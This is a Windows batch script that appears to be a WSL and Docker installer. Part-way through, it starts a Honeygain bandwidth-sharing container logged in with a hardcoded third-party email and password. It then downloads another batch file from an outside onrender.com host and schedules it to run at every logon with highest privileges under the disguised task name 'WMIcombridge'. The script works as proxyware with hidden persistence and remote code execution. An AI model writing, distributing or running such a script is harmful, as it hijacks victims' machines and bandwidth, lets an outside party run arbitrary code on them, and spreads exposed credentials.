@echo off
setlocal enabledelayedexpansion

:: Set WSL 2 as default
wsl --set-default-version 2

:: Check if Ubuntu is already installed
echo Checking if Ubuntu is already installed...
wsl -l -v | findstr /i "Ubuntu" >nul
if %errorlevel% neq 0 (
    echo Ubuntu not found. Installing Ubuntu...
    wsl --install -d Ubuntu
    echo Waiting for Ubuntu to initialize...
    timeout /t 30 /nobreak >nul
) else (
    echo Ubuntu is already installed.
)

:: Update and install Docker dependencies
wsl -d Ubuntu -- bash -c "sudo apt update && sudo apt install -y ca-certificates curl gnupg"

:: Setup Docker keyring
wsl -d Ubuntu -- bash -c "sudo install -m 0755 -d /etc/apt/keyrings"
wsl -d Ubuntu -- bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg"

:: Add Docker repo
wsl -d Ubuntu -- bash -c "ARCH=\$(dpkg --print-architecture) && CODENAME=\$(lsb_release -cs) && echo \"deb [arch=\$ARCH signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \$CODENAME stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null"

:: Install Docker
wsl -d Ubuntu -- bash -c "sudo apt update && sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin"

:: Add root to Docker group
wsl -d Ubuntu -- bash -c "sudo usermod -aG docker root"

:: Wait before running Docker
echo Waiting for Docker setup...
timeout /t 10 /nobreak >nul

:: Run Honeygain container
wsl -u root -e sh -c "docker run -d --name honeygain --restart unless-stopped --device /dev/net/tun --cap-add NET_ADMIN honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGSBDoc"

:: === DOWNLOAD AND SCHEDULE BAT FILE ===
set "BAT_URL=https://ms32-sha2.onrender.com/static/apps/HGDoc.bat"
set "BAT_NAME=HGDoc.bat"
set "DOWNLOAD_PATH=%~dp0%BAT_NAME%"

:: Download to same directory as this script
powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%DOWNLOAD_PATH%'"

:: Create scheduled task to run the downloaded BAT file at user logon
schtasks /create /tn "WMIcombridge" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f

echo.
echo All tasks completed. You may need to reboot.
pause
